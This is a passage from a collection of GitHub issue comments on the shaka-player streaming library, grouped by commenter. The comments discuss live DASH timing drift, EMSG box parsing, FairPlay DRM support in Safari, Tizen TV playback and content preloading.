'#EXT-X-BYTERANGE:121090@616\\n',\n  'main.mp4',\n].join('');\n\nlet manifest = new shaka.test.ManifestGenerator()\n        .anyTimeline()\n        .addPeriod(0)\n          .addPartialVariant()\n            .addPartialStream(ContentType.VIDEO)\n              .mime('video/mp4', 'mp4a')\n      .build();\n\nawait testHlsParser(master, media, manifest);\n\n});\n```. Thanks for the PR!\nPlease, leave .shrinkable(). It actually should do both: shrink if the screen is smaller and grow if the screen is larger (like in your example).\nLooks good otherwise!. ",
    "FeiCao": "thank you!\n. @tdrews @joeyparrish thank you, my MPD@minBufferTime is 2s, I use player the live stream. packager and player start working at the same time. The play content always delay about 10s. After player played about 10 hours, the delay between packager and player have increased more than 10s and the video segment number  witch player request is not the latest number, the following is my mpd\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\n. @joeyparrish  V1.6.4 \nsync with my server\n. @joeyparrish yes, restarting the player reduce the time again, I test it for an hour, the gap between player & packager begins at 6s and it  grows to 11s after 1 hour. Another test that the gap between player & packager begins at 6s and it  grows to 60s after 18 hours.\n. browser: Google Chrome 41.0.2272.118\nplatform:windows 7 Professional Edition  Service Pack 1\nI have changed the initialization segment for different resolution, but I found that  shaka-player did not read new initialization segment anymore. \nthere is no update for segment's resolution information(https://github.com/google/shaka-player/blob/c45a3c273f8b285c07e095da1de8e55adbb3b181/lib/media/manifest_updater.js#L339).\n. mpd.zip\nThere are two MPD files, \"live-a.mpd\" is before change resolution, \"live-b.mpd\" is after.\n. I update the id=0 Representation directly, is there something wrong with it ?\n. yes, you are right!\n. Thank you very much, I just want to support all kinds of Resolutions in living streams, but the streams have different Resolution, For example, stream one has 1280x800 and 320x200, stream two has 1920x1080 and 1280x720. I can not enumerate all Resolutions in Representations.\n First, I modify the init segment and MPD to update the video's Resolution. And Second, I want to modify the Shaka that fetches the init segment at regular time and updates the decoder's info. Thus I may solve this problem. \nThis is my idea, I am not sure that decoder can decode correctly, please give me some advices.\n. I changed MPD file and add a new Representation when change the Resolutions, but the player just request the MPD file, live.zip please help me for checking the MPD file, thank you\n. ",
    "itaykinnrot": "Done\n. Thanks!. Sure - we want to allow customization of the label that the player show in the menu (same as HLS) and I think that the right way to do it is using the DASH manifest since the packager that create it already has all this data. . @joeyparrish thanks for the review - code is update - let me know if anything is missing - Thanks!. @joeyparrish  please review  - thanks!. @TheModMaker @joeyparrish Thanks for the review - fixed.. Hi @joeyparrish  - i think this is a critical issue especially in chrome DRM when it not using the GPU we see stalls due to drop frames.\nAny plan to add this functionality? or we should measure it from the application?\nThanks!. Our use case is that the captions are always hidden since we want to render them ourself (styling that will work cross browser...) and this \"fix\" just stop us from doing that. can we change it to not disabled? . Not sure if it\u2019s help but I\u2019ll f I add this to the MPD - suggestedPresentationDelay to 30s it start to play but stuck after 10-20 sec\nThanks!. Now we have the same stream with Period@start that is not changing - works on ExoPlayer but not on shaka :-( please check.\nThanks!. The stream is playable on other players\nGet Outlook for iOShttps://aka.ms/o0ukef\n\nFrom: Joey Parrish notifications@github.com\nSent: Wednesday, November 22, 2017 11:24:19 PM\nTo: google/shaka-player\nCc: Itay Kinnrot; Comment\nSubject: Re: [google/shaka-player] Live stream fails with \"cannot find segment\" console message (#1117)\nActually, this seems to be unrelated to #1105https://github.com/google/shaka-player/issues/1105.\nWhat I see in a manifest I just fetched is:\navailabilityStartTime=\"2017-11-22T20:14:27.659Z\"\nfetch time 2017-11-22 20:21:56 UTC\nTime since AST = 7 minutes 29 seconds\ntimeShiftBufferDepth=\"PT30S\"\nOldest segment time = 14214923537, timescale 90000 = 157943.6 seconds = 43 hours, 52 minutes, 23 seconds\npresentation time offset = 0\nSo there are no segments within the availability window (7:15 to 7:30). All segments are way past the end of the window.\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHubhttps://github.com/google/shaka-player/issues/1117#issuecomment-346477194, or mute the threadhttps://github.com/notifications/unsubscribe-auth/AAh42Xk7DWmwj0RaLyOoToWn6d2BVUS2ks5s5JECgaJpZM4QYnls.\n. ",
    "seoz": "This happened when I tested Shaka player locally. It made the local test hard.\n. Well this looks intended and testing Shaka locally (not running the local server) is not recommended.\n. ",
    "lwchan2k1": "I am very interested in this feature which can enable advertising support with multi period support together.\n. ",
    "vto5623": "Hi Joey,\nIn this last commit (https://github.com/google/shaka-player/commit/f1a4e251518728ff688ac6bab4085fa5c4169874), there are what appear to be example test messages on lines 756 - 784 of file \"test/dash/dash_parser_manifest_unit.js\", including an example custom message.\nvar emsgCustom = new Uint8Array([\n    0, 0, 0, 55, 101, 109, 115, 103,\n    102, 111, 111, 58, 98, 97, 114,\n    58, 99, 117, 115, 116, 111, 109,\n    100, 97, 116, 97, 115, 99, 104,\n    101, 109, 101, 0, 49, 0, 0, 0, 0,\n    1, 0, 0, 0, 8, 0, 0, 255, 255, 0,\n    0, 0, 1, 116, 101, 115, 116\n]);\nDecoding it looks as though the box goes straight from the type \"emsg\" in bytes 4 - 7 (0 indexed) to the EMSG scheme_id_uri, in this case \"emsgfoo:bar:customdatascheme\".\nThis might not be correct.\nIndeed, according to section 5.10.3.3.3 the spec \"ISO/IEC 23009-1 Information technology \u2014 Dynamic adaptive streaming over HTTP (DASH) \u2014Part 1: Media presentation description and segment formats\", the EMSG box should inherit from FullBox:\naligned(8) class DASHEventMessageBox extends FullBox(\u2018emsg\u2019, version = 0, flags = 0){\n    string scheme_id_uri;\n    string value;\n    unsigned int(32) timescale;\n    unsigned int(32) presentation_time_delta;\n    unsigned int(32) event_duration;\n    unsigned int(32) id;\n    unsigned int(8) message_data[];\n}\nWe believe that this implies that there should be an additional 4 bytes of version and flags (set to 0) between these two fields as defined by Section 4.2 of \"ISO/IEC 14496-12 Information technology \u2014 Coding of audio-visual objects \u2014 Part 12: ISO base media file format\":\naligned(8) class FullBox(unsigned int(32) boxtype, unsigned int(8) v, bit(24) f)\n    extends Box(boxtype) {\n    unsigned int(8) version = v;\n    bit(24) flags = f;\n}\n. ",
    "ram95014": "I installed shaka player 1.6.2 on my local ubuntu instance. I generated a\nVOD MPD and I was able to successfully playback the VOD content. However,\nwhen I tried using a live DASH content using DashCast:\nDashCast -vf x11grab -vres 800x600 -vfr 25 -v :0.0 -live\nand tried to play it back with the player, I got the error that I had\npasted before.\nThe MPD file is like so (may not match the one that created the error log,\nbut very similar):\n\n<?xml version=\"1.0\"?>\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n\navailabilityStartTime=\"2016-01-12T20:11:06.506Z\"\nminBufferTime=\"PT1.000000S\" timeShiftBufferDepth=\"PT00H00M10S\" type=\"dynamic\n\n\" profiles=\"urn:mpeg:dash:profile:full:2011\" minimumUpdatePeriod=\"PT1000S\">\n\ndashcast.mpd\n\n\n\n<SegmentTemplate timescale=\"25\" duration=\"25\"\n\nmedia=\"$RepresentationID$_$Number$_gpac.m4s\" startNumber=\"1\"\ninitialization=\"$RepresentationID$_init_gpac.mp4\"/>\n\n<Representation id=\"v1\" mimeType=\"video/mp4\" codecs=\"avc1.64001e\"\n\nwidth=\"640\" height=\"480\" frameRate=\"25\" sar=\"1:1\" startWithSAP=\"1\"\nbandwidth=\"1000000\">\n\n\n\n\n\nAs you can in the error log, the UTC time difference between the two\nmachines is small. I am using a chrome browser on a OSX machine, and the\nApache server is running on Ubuntu instance in a VM in the OSX.\nUnfortunately, I am unable to create a publicly visible server at this time\nfor you to test at this time.\n-Ram\n\nOn Tue, Jan 12, 2016 at 11:22 AM, Joey Parrish notifications@github.com\nwrote:\n\n@ram95014 https://github.com/ram95014 I'm going to need more\ninformation in order to diagnose.\n- Can you provide a URL which reproduces the problem?\n- What version of Shaka Player are you using?\n- Can the problem be reproduced on our stock demo page, or is some\n  custom app logic required to access your stream?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/264#issuecomment-171022965\n.\n. Hi joey,\nI had to move on to other things. I had to stop working on dash...\nRam\nOn Feb 26, 2016 4:26 PM, \"Joey Parrish\" notifications@github.com wrote:\n@ram95014 https://github.com/ram95014 It's been a while since we heard\nfrom you. Did you file a bug with gpac? Did you find some other solution?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/264#issuecomment-189537502\n.\n. \n",
    "tbournez": "Thank you for your answer. I just try the first solution and it works. I'll try the 2 and 3 and choose the best. If we can have this in v2.0 it is great !!\n. ",
    "vincentma": "@tdrews By checking navigator.userAgent, it might be workaround here. However, if we are going use Shaka player in Chromecast (replace its own MediaPlayerLibary), then it might be a problem here because Chromecast support both playready and widevine.\nhttps://developers.google.com/cast/docs/media#delivery-methods-and-adaptive-streaming-protocols\n. I have a curious question. Actually the CEA 608/708 captioning data lives inside the video data, in a specific way, frame NAL unit. So for a DRM protected stream, there's no way to see (or parse) the video data in application code.\nSo the ideal solution is to have the parser sitting inside the Chrome's video element decoding process, and populate the CC tracks.\nCorrect me if I am wrong.\n. ",
    "sarahachem": "Thank you for your reply.\nIndeed a license is needed and will be provided through a licensing server, and then the video will be decrypted and played offline. \nAs you mentioned, Shaka does not seem to be the appropriate solution for my use-case.\n. ",
    "superbderrick": "Thank you for your response. Yeah It is helpful.\nDerrick.\n. ",
    "robwalch": "@joeyparrish any update on this? We're considering forking and providing a PR with this feature, but could use some pointers on implementing it as a plugin that has access to video data.. I just tried the demo page with Firefox Nightly 50.0a1 (2016-06-07). The Unified Streaming \"Tears of Steel (Widevine)\" asset works! It did not work in FF 49 so it looks like mozilla has fixed the CDM issue(s) there.\nI have not tried shaka-player v1.6.5 (the version jwplayer currently uses). It would be great if it just worked in 1.6.x but we're pretty excited about integrating shaka v2 once it's released.\n. Update: Widevine streams are playing shaka-player 1.6.5 with Firefox Nightly 50.0a1 (2016-06-07).\n. Do you have an idea of what the issues are with getting EME working with Firefox 47? Firefox 47 is available now, and Mozilla has announced Widevine support would be available in this release.\nFirefox 50 isn't expected to be released until November, so this puts us in a bind.\nhttps://blog.mozilla.org/futurereleases/2016/04/08/mozilla-to-test-widevine-cdm-in-firefox-nightly/\nhttps://blog.mozilla.org/futurereleases/2016/02/04/update-on-2016-firefox-release-schedule/\n. Yes I saw a different problem that is resolved in 47. Thanks!\n. Thanks Joey! Sorry I didn't notice the mixed content issue.\nFor the VTT issue I'm curious if the exception comes from the video tag or text tracks and if it breaks playback. In general all errors we catch or handle from shaka stop playback. If there are any we could just log without interrupting playback we'd want to keep track of these.\n. OK. Sounds valid. We do the same in jwplayer when side loading VTT tracks to avoid CORs issues (video src origin is not always the same as the text track scr).\nI think our handling of cue parsing a little more lenient. @egreaves correct me I'm wrong - If we can't parse positioning info we ignore it.\n@joeyparrish I'm not sure if this track would break video playback but if this is the intended behavior then I'm happy to close this issue.\n. It would be helpful to log and ignore.\n\nOn Oct 3, 2016, at 7:19 PM, Joey Parrish notifications@github.com wrote:\nPing! @robwalch, would it be helpful to log and ignore when we encounter bad settings? Or are we okay with dispatching an error?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Yes thanks @TheModMaker!. \n",
    "chrisfillmore": "@joeyparrish I have a question: is there a reason CEA-608 / CEA-708 support is tied in to HLS?\nA coworker of mine who works on the video side was asking about Shaka support for these standards, and he didn't think it applied particularly to HLS (other than the fact that DASH specifies that text tracks should be included in the manifest). Can you clarify?\n(We don't need this feature, I'm just asking out of curiousity. Thanks.). I was on a call today with Apple where they assured me HLS-FP playback was possible using MSE and EME in Safari, and that solutions existed in market which used these API's. Hopefully we can get some support from them, so I'll send you an email.. @joeyparrish I\u2019m in touch with Apple about getting a license challenge message in Safari using MSE. You mention calling MediaKeySession#update with the certificate after you receive the phony \u201ccertificate\u201d keymessage. I\u2019m working on a demo to send to Apple but I\u2019m not seeing the same behaviour you are, the empty keymessage event. I just get a webkitkeyerror from the session.\nHave I understood your post correctly? I\u2019ll take a closer look at your fairplay branch to see if I\u2019ve missed anything. I\u2019ve also sent you the demo app I\u2019m working on so far, in case you want to look at it (you should receive an invite).. Just to add more detail, this is the callback I have attached to webkitkeymessage:\n```\nfunction onKeyMessage (e) {\n  console.debug('webkitkeymessage was fired', e);\n  var strMessage = String.fromCharCode.apply(undefined, e.message);\nif (strMessage === 'certificate') {\n    console.debug('cdm requested the certificate');\n    keySession.update(new Uint8Array(certificate)); // Do I call update like this??\n  } else {\n    console.debug('license challenge available');\n  }\n}\n```\nIt's possible I have some other issue. I know the certificate works in general, as I've played HLS-FP content with it under other circumstances. Also, I am using com.apple.fps.2_0.. @joeyparrish I've learned it's not necessary to concatenate the initData with the certificate when using com.apple.fps.2_0. The initData should be passed to createSession() as-is.. @avelad I can't comment on playback, because the test app I wrote doesn't get that far. But I can produce a Fairplay license challenge.. I wanted to add: I don't think it's necessary to call DrmEngine#formatFairPlayRequest_. Right now we're doing HLS-FP playback in Safari via src= and I don't do any manipulation on the message from the CDM, I pass it on directly to the server. This may depend on how the license server is configured?. Safari 11 is out:\nhttps://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Safari_11_0/Safari_11_0.html\nI notice that requestMediaKeySystemAccess is once again undefined. :(. com.apple.fps.1_0 is for streaming via videoElement.src = playlist.m3u8. This is the method of playback documented in the Fairplay SDK demo.\ncom.apple.fps.2_0 is for playback via MSE.. @joeyparrish I am tinkering with the fairplay branch to see if I can get it working. Do you want to assign to me? It won't get done overnight, but I do have time to work on it.. Thanks @barbarosalp, I have it.. @joeyparrish Could someone update fairplay with the latest from master?\nI am hoping I can submit a PR against fairplay with this commit:\nhttps://github.com/chrisfillmore/shaka-player/commit/8a057d7a9b7491dc79625923dd413c396b028af2\nI haven't achieved playback yet but I can make a successful license request. I'm trying to play some TS content but it's not working, I'll need to do more investigation. I'm hoping in the meantime we can review the changes I've made.. Hi @karlg-arris, this implementation would still allow custom license requests and responses via the networking engine. Nothing has changed in that layer.\nI think the only app-specific code which I neglected to remove was in drm_engine:\nrequest.headers['Content-Type'] = 'application/octet-stream';. Beep beep Shaka team\nI'd like to submit a PR against fairplay so that we can advance the state of FP support in Shaka, even if it's not all the way to playback. Can you advise on next steps @joeyparrish ?. Thanks Joey, sorry I haven't looked at this again yet. I will submit a PR early next week so I don't fall too far behind.. I invite anyone that has HLS-FP content that they can test with to give this commit a shot. I will need to integrate this into my custom app to do more thorough testing. That probably won't happen till January. Merry Christmas everyone!. Yes the initData is different from fps1.0 to fps2.0. In 1.0, the initData is the SKD value from the manifest. In 2.0 it is the PSSH (as far as I know). I'm not aware of a working demo for fps2.0.. I see that our content includes mspr:pro blocks as well. However, we make no use of this information on web clients. (Other PlayReady clients, e.g. UWP, may use it.). I was curious if there was any news about this topic. I see that the DASH-IF ticket 119 is closed and the spec defines support for tiled thumbnails. This solution is good news (Tizen TV's, including 2017 models, do not support multiple video elements).\nWe expect to be able to provide keyframes for our content in the near-ish future (I think within the next few months). I'm a bit fuzzy on the player's role in handling thumbnail data from the manifest. Will the player fetch the tiles, and display them over the timeline? Or just fetch, and expose it to the client application to draw as they see fit?\nDoes Shaka plan to add this support (whatever it looks like)? If so, any estimate of the effort required? Thanks.. Thanks @wilaw. I have a question (cc @joeyparrish on this): Looking at media events, it's not obvious to me that there is any event that signals a scrub. So I assume that the client UI application will need to listen for their own scrub events and ask the player for the thumbnail information.\nOn TV platforms, there is no scrubbing. Our content does not have trick mode tracks, so in order to support \"fast forward\", we enable the following behaviour:\n\nUser presses fast forward on the remote\nWe show a timeline on the UI\nThe playhead can advance on the timeline at whatever speed the user is fast-forwarding (2x, 4x, etc)\nWhen the user reaches the desired point on the timeline, they press play\nWe seek the video to that point\n\nWe would like to add thumbnails over the playhead during this fake fast forward. It's not totally clear to me what the sequence of interactions will be between the client application and the player. Do you think our use case is supported by the spec?\nI appreciate any insight you can offer. Let me know if I can provide more info.. Hi Joey, I need some advice on how to proceed.\nI think it's important that the test load real content. If I just write this:\nit('handles load interrupting unload', function(done) {\n  player.load('', 0, factory1).then(function() {\n    player.unload();\n    return player.load('', 0, factory1);\n  }).then(done).catch(fail);\n});\n...then the test does not fail when it should. The original test I wrote connected to a development server in our office to load content, and that correctly failed. I've been trying to understand the bootstrapping process that the Shaka integration suite uses to create manifests for the local test content (I've been looking at player_integration.js and test/util/test_scheme.js). This seems to me like the way to go with this test, but I also get the feeling I'm just missing something. Is it possible to mock content?\nThanks for your help.. Hi Joey, sorry to be out of touch. Yes it looks like circumstances only align correctly to produce the bug when the player goes through a real unloading process. You can reproduce it in the demo app with the steps I listed in the issue above (you just have to add the call to player.unload() before calling load).\nI'm happy to write the test myself. We rely on Shaka extensively so my familiarity with the code base and test suite is of value to me and my employer. We have an unresolved ticket to return to the main Shaka branch once various PR's are merged, so, eventually I'll write this test, but I have a few other pressing things right now.. I signed the CLA!. Hi Joey, looks like I am probably using my work address for git but my personal address for the CLA, so I'll have to resolve that in the morning. Thanks.. I added my work email to my Google email accounts, help me @googlebot you're my only hope. @jlnabais What browser are you testing in?. I've asked Samsung to comment, either on this ticket or by email. I'll pass on the info if it ends up in my inbox.. Agreed, thanks.. @kevinscroggins-youi my team also investigated workarounds to this issue and concluded that there was no suitable solution, so we dropped support for 2016 model TV's. Your only option would be to fork Shaka and create a custom hack specifically for these TV's. Samsung will almost certainly not fix this bug.. I just want to add a note: I am having an ongoing problem getting Shaka to run on Tizen in compiled mode. It compiles fine, but I have so far been unable to get the player to work in compiled mode on the TV. All my testing is done in uncompiled mode. I will be investigating this further.. Thanks Joey.\nAlso as a heads up -- all of my work / testing is in Tizen HTML5 application, i.e. not the Tizen web browser.. The Tizen OS has a web browser, which I presume is like a regular browser. (I doubt anyone ever uses it.) But you can also develop native apps, either in an HTML5/JS environment or directly in C/C++.. From time to time I have had to advise people to use --unsafely-treat-insecure-origin-as-secure, perhaps the docs could also link to this page:\nhttps://sites.google.com/a/chromium.org/dev/Home/chromium-security/deprecating-powerful-features-on-insecure-origins. This is a feature we anticipate wanting to provide to our clients. And more than that, I expect we'd want to preload more than just one piece of content. This is basically to support rapid channel switching behaviour, and the like. There's another wrinkle: I also anticipate we'd want to preload some piece of content and then provide it to a specific Player instance. The reason for this is we may have multiple Players going at once.\nIf I'm told we need this feature, I think I could work on a PR. But given the above I'd like your input.. Idea, perhaps total brain fart:\n/**\n * Create a Preload, which can be passed to any Player so that it\n * instantly has preloaded content.\n * @static\n * @param {object} params Anything it would need to preload content\n * @returns {shaka.Player.Preload}\n */\nPlayer.createPreload (params) {\n  // Do preloading work\n}. Another thought about this: it would be nice if Player#load did not require a video element to be set. It would also be nice if we could configure the player to fetch segments or not. A player with no video element attached would then just fetch manifest updates, and (optionally) build a video buffer.. @joeyparrish that looks pretty good, the only suggestion I have is that it would be preferable if the client could explicitly call something like token.unload(), instead of having Player do the invalidation implicitly. This would enable e.g. the user switching back and forth between two or more channels.. I would expect that a token for a live stream would, at minimum, continually fetch and parse manifests. At any time, the client could tell it to start downloading segments as well, via an explicit call like token.startBuffering().\nThis way the client could define its own user behaviours that signal an upcoming channel change (browsing a guide, rapid channel up-down behaviour, \"previous channel\" button on the remote, etc). Furthermore, the end-user could even tell the application how many channels to preload, potentially useful if they have a very high quality connection.. Speculatively buffering multiple streams at the same time might be undesirable, particularly on slower connections. We may also already have up to 4 streams already playing on-screen, so we don't necessarily want to use bandwidth doing more buffering.\nI have seen a proof-of-concept on Android of a custom player doing rapid channel switching without buffering the background streams, and it looks good. I was actually impressed, it looked like real TV channel switching. So I think this is worth investigating.\nWe want to be able prefetch, where possible:\n1. Manifests\n2. Initialization segment\n3. License\nI think doing so should substantially reduce stream startup time. Regarding (3), perhaps, when preloading, the player could fetch a single segment from the stream in order to generate the challenge and fetch the license.\nThoughts on this?. @bennypowers Sorry unfortunately it's not, it was work done by someone else on my team.. Random thought: perhaps Shaka could define an interface for e.g PreloadManager, and have a SimplePreloadManager implementation. The client app could override this implementation to customize functionality.. While writing my response to #1500, I realized a problem with preloading may be, where does NetworkingEngine come from? Should a \"preload instance\" (whatever it looks like) have its own NetworkingEngine?. Will licenses be preloaded? If so, how will the client handle custom authorization? We would need to be able to handle formatting license requests for individual streams (our license proxy resides at a static URL, and identifying information is provided in the request body).. Fwiw I've seen the same behaviour in IE11 and Tizen because the polyfill uses the fake KEY_ID_, same as #884. Although playback still works, at least in some cases.. Fyi I have both a 2016 and 2017 TV now if I can assist with troubleshooting.. Yes I tried that too and also couldn't get an account. I'll talk to Samsung and get in touch with you.. @EloB in general protected playback with Shaka works on Tizen 2017 TV's and newer. The implementation of EME on 2016 model TV's is extremely buggy, and I would caution you against trying to support that platform.. Thanks Joey. Our suspicion is that Tomcat's CorsFilter may not correctly interpret the spec.. Thanks @ismena !. @ismena looks like our live content uses it. It's not simple to share because there is a custom authorization process, but I can send you an email and provide you with a demo app to test with. I wasn't sure which email was yours, from looking at the CONTRIBUTORS file. Should I email shaka-player-issues?. Wait @ismena I wasn't thinking -- the content is HLS-FP, but Shaka doesn't have FP support yet. Wouldn't EXT-X-SESSION-KEY denote FP content? How will this work?. Darn, we have some HLS-PR content but it doesn't use EXT-X-SESSION-KEY. Sorry!. As a proof-of-concept, a colleague of mine built Shaka into an Electron app and was able to achieve playback. Perhaps you could do something similar?. As a proof-of-concept, a colleague of mine built Shaka into an Electron app and was able to achieve playback. Perhaps you could do something similar?. A question: Why does Shaka do content type detection in this way? Why not simply request the manifest at whatever URL is provided, and look at the Content-Type of the response? If there's no Content-Type in the response, then do detection by file extension. If no detectable file extension, throw an error. Is there a reason it wasn't built this way?. Our ads provider got back to me and pointed out that this is URL format is in line with the Java Servlet spec, section 7.1.1:\n\n7.1.1 URL Rewriting\nURL rewriting is the lowest common denominator of session tracking. In cases where a\nclient will not accept a cookie, URL rewriting may be used by the server to establish session\ntracking. URL rewriting involves adding data to the URL path that can be interpreted by the\ncontainer on the next request to associate the request with a session.\nThe session id must be encoded as a path parameter in the resulting URL string. The name of\nthe parameter must be jsessionid. Here is an example of a URL containing encoded\npath information:\nhttp://www.myserver.com/catalog/index.html;jsessionid=1234\n\nHe believes that the player should be able to understand this kind of URL, and I'm inclined to agree.\nBut this just makes me wonder if URL parsing should be application-level business logic. Applications could provide custom functions for different backend API's. What do you think of this idea?\n(Having said all that, our ads provider also thinks a HEAD request could be easily supported, but it would be nice to avoid the additional request altogether.). > In fact, you can, if you wish, do your own URL parsing before calling load(), and use the results of that to determine the right parser factory to specify.\nI didn't even think of this. Thanks Joey!. I'm reading the media element spec for an unrelated issue and saw this paragraph:\n\nThis specification does not currently say whether or how to check the MIME types of the media resources, or whether or how to perform file type sniffing using the actual file data. Implementors differ in their intentions on this matter and it is therefore unclear what the right solution is. In the absence of any requirement here, the HTTP specification's strict requirement to follow the Content-Type header prevails (\"Content-Type specifies the media type of the underlying data.\" ... \"If and only if the media type is not given by a Content-Type field, the recipient MAY attempt to guess the media type via inspection of its content and/or the name extension(s) of the URI used to identify the resource.\").\n\nhttps://dev.w3.org/html5/spec-preview/media-elements.html#concept-media-load-resource\nThe portion of the HTTP spec referred to is 7.2.1:\n\nAny HTTP/1.1 message containing an entity-body SHOULD include a\n   Content-Type header field defining the media type of that body. If\n   and only if the media type is not given by a Content-Type field, the\n   recipient MAY attempt to guess the media type via inspection of its\n   content and/or the name extension(s) of the URI used to identify the\n   resource. If the media type remains unknown, the recipient SHOULD\n   treat it as type \"application/octet-stream\".\n\nhttps://tools.ietf.org/html/rfc2616#section-7.2.1\nI'm just sharing this for posterity. Future users -- servers really should allow you to make a HEAD request to obtain the Content-Type.. @joeyparrish What folder are you running the server from? It needs to be from the root of wherever it's unzipped, because the app will try to load configs from a specific path.\nEdit: The correct address would be localhost:port/sample/index.html. Steps to get started (sorry if I missed these in my original email, I've been sending this out to a few people for testing):\n\nSelect DFW-PROD config\nClick Load\nApplication will go through a device activation process, you should see \"Device successfully activated!\" or \"Device is already activated.\" in the logs. (If a network call fails, reload and start again.)\nSelect Cisco DRM radio button\nThere are a couple channels to test with. Enter one of the following numbers in the CCID field: 2355, 3669\nClick Load\n\n(If you get a license failure, do localStorage.clear(), reload and try again. This will force a fresh activation.\nAh yes, I forgot about CORS, probably because I am perpetually running Chrome with --disable-web-security. Yes you do need to do that. Thanks @joeyparrish!. @joeyparrish, our ads provider deployed an update over the weekend which they are hoping will address some of the freezing we are seeing. I tested this morning and didn't see an improvement, but I will be testing more contents tomorrow. I've also sent you an updated demo app. Thanks again for your help.. I've updated the demo application once more this morning and sent you folks an email.. Thanks Joey. I'm told that YoSpace deployed some changes on Monday and there's been some improvement. I'm watching stream 2355 now. I still see this warning during ad breaks:\nThe last segment should not end after the end of the Period.\nAnd after returning from the ad break I also see some failed assertions:\nAssertion failed: lastReference cannot begin after the end of the Period\nIt looks like the player recovers well though. I joined the stream during an ad break and when it returned to content, there was a brief freeze, but the stream has been smooth since then. I played through another ad break with no hiccups at all.. I think YoSpace has made updates which have resolved most (maybe all) of the freezing issues we've been seeing. Thanks for checking in! I'll close the ticket for now.. It's no problem. Feel free to let us know if an ask is too much given your workload. I totally understand that. We didn't really think this was a client / player problem to begin with, but of course it behooves us to investigate from all angles.. Just wanted to mention that this issue is on our radar. We have a requirement to allow users to pause live video for long periods of time.. I've also seen this in the demo app.. I also see shaka.Player.isBrowserSupported is not a function.. Would you like me to send a demo app to reproduce?. It's not the value of results[1] that is problematic. The value of shaka.text.Cue.textAlign in compiled Shaka is:\n{\n  Hc: \"end\",\n  Ic: \"left\",\n  Mc: \"right\",\n  Nc: \"start\",\n  tb: \"center\"\n}\nSo when we ask for shaka.text.Cue.textAlign['LEFT'], the value is undefined.\nI can send a demo over in just a bit. [edit: demo app sent]. I sent another email just now with repro steps for the Shaka demo app.. I'd like to offer a dissenting opinion. I invite others to chime in if they disagree, particularly if this enhancement would add value for them.\nA few months ago we attempted an integration with another vendor's HTML5 player, and decided to drop it after several weeks of work. One aspect of this player which was unappealing was how it attempted to be a universal solution for all use cases. We were looking to solve a particular problem, and were burdened with solutions to problems we didn't have.\nSomething that is appealing about Shaka is how it is relatively lightweight. It solves the particular difficult problem of adaptive streaming. Setting src= is not a difficult problem to solve (in the context of streaming video). Apple even provides a demo in the FPS SDK, if you need support for Safari.\nIf support for src= increases complexity in Shaka to the extent that it makes it more difficult to develop solutions for streaming, then IMO it seems like more of a burden than a help. I would argue that client applications should not have a hard dependency on Shaka -- whatever abstraction sits between the client and Shaka should allow the app to play via src=.. If that's the case, then great! . > Playback can continue further back from the edge, but eventually, drift can also overtake timeShiftBufferDepth. When this happens, the actual segments are completely outside of the seek range, which leaves the player unable to play anything at all.\nThis is an issue we may be running into in our application. I haven't done a complete investigation yet. But since I'm pretty sure someone will ask me -- May I ask, is this refactoring being worked on currently? Is there a (rough) estimate for when the work will be done? Thanks.. Ok thanks Joey \ud83d\udc4d . @joeyparrish can you confirm, with this change, that Shaka would ignore device time for SegmentTemplate + SegmentTimeline, i.e. this would also resolve clock sync issues for such content?. \n1000 closed! GJ. Could this be enforced programmatically? I am essentially adding this behaviour to our shaka wrapper module right now, so that the client application can't request two players for the same video element.\n```\n// Store this somewhere\nvar currentPlayers = new WeakMap();\nshaka.Player.getInstance = function (mediaElement) {\n  var player = shaka.Player.currentPlayers.get(mediaElement);\n// You would probably need an API to know if the player was destroyed\n  if (player && !player.isDestroyed()) {\n    return player;\n  }\n// Would need to restrict calls to new Player() somehow\n  player = new shaka.Player(mediaElement);\n  currentPlayers.set(mediaElement, player);\nreturn player;\n}\n```\nSomething like the above? Just an idea. Support for WeakMap is pretty good:\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap#Browser_compatibility. Yes absolutely, thank you for that detailed explanation!. We have a scenario where we need to know the bandwidth levels from the manifest before we start playback, so that we can set the max bandwidth in order to restrict certain variants.\n@peterdotjs if you do make a custom plugin, would you share with a PR? @theodab could something like that get merged?. Our architecture is intentionally generic, so that the library can be reused across multiple projects. Players and DRM service integrations are decoupled and have no insight into each others' lifecycles. \nThe primary culprit in this complex flow is the \"device activation\" requirement for one of our service integrations. This flow may be invoked in a variety of circumstances, both before and after playback has happened (and polyfills have been installed). It depends on user behaviour, the response from the activation server, etc etc.\nThanks for the suggestion.. @joeyparrish I can make a PR for this since I'm supposed to deliver this feature, not only for Shaka but also for our Safari player implementation. Here's what I had in mind, can you advise:\n\nProvide the player's onEvent callback to new shaka.media.DrmEngine(...)\nInvoke onEvent with a FakeEvent when the call to session.update() is fulfilled\nI was thinking of giving the event a type of keysessionupdate\n\nOnly thing I noticed was the signature for new shaka.media.DrmEngine(...) is getting a little long, and I see in other places you use a playerInterface. Would you suggest using a playerInterface in this case?. I'm about done the work, and running the tests now I see this fail on master:\nSafari 11.0.0 (Mac OS X 10.12.6) MediaSourceEngine removes segments FAILED\n    Expected 15 to be close to 10.\n    test/media/media_source_engine_integration.js:142:57\n    promiseReactionJob@[native code]\n    Expected 15 to be close to 20.\n    test/media/media_source_engine_integration.js:143:58\n    promiseReactionJob@[native code]\n    Expected 25 to be 20.\n    test/media/media_source_engine_integration.js:146:50\n    promiseReactionJob@[native code]\n    Expected 5 to be close to 10.\n    test/media/media_source_engine_integration.js:147:58\n    promiseReactionJob@[native code]\nThis is without my changes.\nOn the branch with my changes, in my most recent test run, I see this failure too:\nSafari 11.0.0 (Mac OS X 10.12.6) MediaSourceEngine trims content at appendWindowEnd FAILED\n    Expected 6.916666666666667 to be close to 10.\n    http://localhost:9877test/media/media_source_engine_integration.js:332:57\n    promiseReactionJob@[native code]\n    Expected 6.916666666666667 to be close to 18, 1.\n    http://localhost:9877test/media/media_source_engine_integration.js:335:57\n    promiseReactionJob@[native code]\nBut I've run the tests a few times and I think I see varying behaviour out of some integration tests. 